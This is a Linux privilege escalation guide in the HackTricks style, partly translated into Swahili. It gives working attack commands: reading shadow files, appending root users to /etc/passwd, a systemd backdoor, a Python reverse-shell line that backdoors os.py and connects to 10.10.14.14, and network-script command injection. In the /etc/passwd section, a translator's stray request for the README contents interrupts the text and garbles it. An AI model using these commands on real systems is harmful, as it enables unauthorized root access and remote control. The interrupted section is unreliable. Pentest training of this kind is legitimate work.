SSH agent forwarding inakuwezesha **use your local SSH keys instead of leaving keys** (without passphrases!) kubaki kwenye server yako. Kwa hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** located in your **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*`, kila wakati mtumiaji anapoelekea mashine tofauti, host hiyo itaweza kufikia funguo (ambayo ni suala la usalama).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Mafaili ya Kuvutia

### Mafaili ya Profaili

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **sensitive details**.

### Passwd/Shadow Files

Kutegemea mfumo wa uendeshaji (OS), faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa zikitumika chini ya jina tofauti au kunaweza kuwepo nakala za akiba. Kwa hivyo inapendekezwa **zitafute zote** na **angalia kama unaweza kuzisoma** ili kuona **kama kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza nenosiri kwa mojawapo ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ili nifanye tafsiri na kuingiza maagizo ya kuunda user `hacker`, ninaomba ufafanuzi au yaliyomo ya faili ya src/linux-hardening/privilege-escalation/README.md (au unataka nifanye mabadiliko maalum yaliyofupishwa?). Tafadhali:

- Nipe yaliyomo ya README.md unayotaka kutafsiriwa (nipatie markdown kamili).
- Unataka niingize maagizo ya kuunda user `hacker` ndani ya faili hiyo (kwa mfano sehemu ya code block yenye amri za kuunda user na password)? Au unataka tu nipe amri za terminal hapa katika jibu?
- Ikiwa ungependa nifanye auto-generate password, niambie urefu na ikiwa inapaswa kuwa na herufi kubwa/dogo/nambari/alama maalum.

Nisubiri faili au uthibitisho wa jinsi unavyotaka nidanganyike.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` kwa `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa bandia bila nenosiri.\
ONYO: unaweza kudhoofisha usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko kwenye `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia ikiwa unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika kwenye baadhi ya **faili za usanidi za huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha server ya **tomcat** na unaweza **kubadilisha faili la usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa mara ijayo itakapowashwa tomcat.

### Angalia Folda

Folda zifuatazo zinaweza kuwa na nakala za akiba au taarifa zinazovutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hauwezi kusoma ile ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Isiyo ya Kawaida/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika zilizopita
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml faili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichika
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zenye passwords

Soma code ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazowezekana ambazo zinaweza kuwa na passwords**.\
**Chombo kingine cha kuvutia** unachoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni programu ya chanzo wazi inayotumika kupata passwords nyingi zilizohifadhiwa kwenye kompyuta ya eneo kwa ajili ya Windows, Linux & Mac.

### Logs

Ikiwa unaweza kusoma logs, unaweza kuwaze kupata **taarifa za kuvutia/za siri ndani yao**. Kadri log ilivyo ajabu, ndivyo itakavyokuwa ya kuvutia zaidi (huenda).\
Vilevile, baadhi ya **bad** zilizowekwa vibaya (backdoored?) **audit logs** zinaweza kukuwezesha **kurekodi passwords** ndani ya audit logs kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logs kikundi** [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa msaada mkubwa.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Pia unapaswa kuangalia faili zinazoambatanisha neno "**password**" katika **jina** au ndani ya **maudhui**, na pia angalia IPs na emails ndani ya logs, au hashes regexps.\
Sitaelezea hapa jinsi ya kufanya haya yote, lakini ikiwa unavutiwa unaweza kuangalia ukaguzi wa mwisho unaofanywa na [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Faili zinazoweza kuandikwa

### Python library hijacking

Ikiwa unajua **wapi** script ya python itatekelezwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **kuhariri python libraries**, unaweza kubadilisha OS library na kuingiza backdoor (ikiwa unaweza kuandika mahali script ya python itatekelezwa, nakili na ubandike maktaba os.py).

Ili **backdoor the library** ongeza tu mwishoni mwa maktaba os.py mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Udhaifu katika `logrotate` unawaruhusu watumiaji wenye **write permissions** kwenye faili la log au saraka zake za mzazi kupata ruhusa zilizoinuka. Hii ni kwa sababu `logrotate`, mara nyingi ikiendeshwa kama **root**, inaweza kudhibitiwa ili itekeleze faili yoyote, hasa katika saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa sio tu katika _/var/log_ bali pia katika saraka yoyote ambapo rotation ya log inatumika.

> [!TIP]
> Udhaifu huu unaathiri `logrotate` toleo `3.18.0` na zile za zamani

Taarifa za undani kuhusu udhaifu ziko kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni karibu sawa na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila unapogundua kwamba unaweza kubadilisha logs, angalia nani anasimamia logs hizo na angalia kama unaweza kuongeza ruhusa kwa kubadilisha logs kuwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Rejea ya udhaifu:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote ile, mtumiaji anaweza **write** script ya `ifcf-<whatever>` kwenye _/etc/sysconfig/network-scripts_ **or** anaweza **adjust** ile iliyopo, basi **system is pwned**.

Network scripts, _ifcg-eth0_ kwa mfano hutumika kwa muunganisho wa mtandao. Zinaonekana hasa kama faili za .INI. Hata hivyo, zinakuwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Kwenye kesi yangu, `NAME=` iliyowekwa katika network scripts hizi haishughulikiwi ipasavyo. Ikiwa jina lina **nafasi tupu (white/blank space), mfumo unajaribu kutekeleza sehemu iliyofuata baada ya nafasi hiyo**. Hii inamaanisha kuwa **kila kitu baada ya nafasi tupu ya kwanza kinatekelezwa kama root**.
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

The directory `/etc/init.d` is home to **skripti** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na Upstart, mfumo mpya wa service management uliotanguliwa na Ubuntu, ukitumia configuration files kwa kazi za usimamizi wa huduma. Licha ya mabadiliko kwenda Upstart, SysVinit scripts bado zinatumika pamoja na Upstart configurations kutokana na safu ya ulinganifu ndani ya Upstart.

**systemd** inatokea kama initializer na service manager wa kisasa, ikitoa vipengele vya juu kama kuanzisha daemons kwa mahitaji, usimamizi wa automount, na snapshots za system state. Inapanga faili katika `/usr/lib/systemd/` kwa distribution packages na `/etc/systemd/system/` kwa mabadiliko ya msimamizi, ikirahisisha mchakato wa usimamizi wa mfumo.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks kwa kawaida hu-hook syscall ili kufichua uwezo wa kernel wenye privileges kwa meneja wa userspace. Uthibitishaji dhaifu wa meneja (mfano, signature checks zinazoegemea FD-order au skimu mbaya za password) unaweza kumruhusu app ya local kuiga meneja na kupanda hadi root kwenye vifaa vilivyobarikiwa tayari. Jifunze zaidi na maelezo ya utekaji hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery katika VMware Tools/Aria Operations inaweza kutoa njia ya binary kutoka kwa mistari ya amri za mchakato na kuiendesha na `-v` chini ya muktadha wa privileges. Permissive patterns (mfano, kutumia \S) zinaweza kuendana na listeners waliowekwa na mshambuliaji katika maeneo yanayoweza kuandikwa (mfano, /tmp/httpd), zikisababisha utekelezaji kama root (CWE-426 Untrusted Search Path).

Jifunze zaidi na uone pattern ya jumla inayoweza kutumika kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
